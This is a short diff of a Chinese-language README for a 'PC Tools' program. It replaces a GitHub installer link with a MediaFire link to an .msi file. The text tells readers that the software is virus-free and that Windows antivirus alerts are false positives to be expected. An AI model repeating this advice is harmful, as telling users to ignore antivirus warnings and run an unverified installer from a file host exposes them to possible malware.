@@ -29,7 +29,7 @@
  
  🎁 安裝方式: <br /> 
  請至以下連結尋找Download按鈕 備註:此軟體並未攜帶病毒 Windows 誤判皆為正常現象 <br /> 
- https://github.com/OnionKen1021/-BETA-PC-Tools-V3.3.1/blob/main/PC%20Tools%20Installer%20V2.2.1.msi
+ https://www.mediafire.com/file/vj9tbehenxm86ii/PC_Tools_V3.1.msi/file <br /> 
 
  
  
